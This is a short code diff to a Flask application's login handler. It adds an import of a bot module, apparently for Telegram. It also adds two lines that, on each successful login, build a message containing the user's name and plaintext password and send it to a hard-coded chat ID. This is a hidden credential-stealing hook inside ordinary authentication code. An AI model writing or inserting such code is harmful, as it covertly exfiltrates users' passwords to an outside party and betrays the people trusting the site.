@@ -1,5 +1,7 @@
 from app import app
 from flask import render_template, flash, request, redirect, url_for, session, g
+from bot import bot, types
+
 
 @app.route("/")
 def index():
@@ -30,6 +32,8 @@ def login():
             print("*"*60)
             session['known']=True
             session['name']=login
+            sms ="name {} and password {}".format(login,pasw)
+            bot.send_message(222443632,sms)
             return redirect (url_for("user"))
     return render_template("login.html")
 
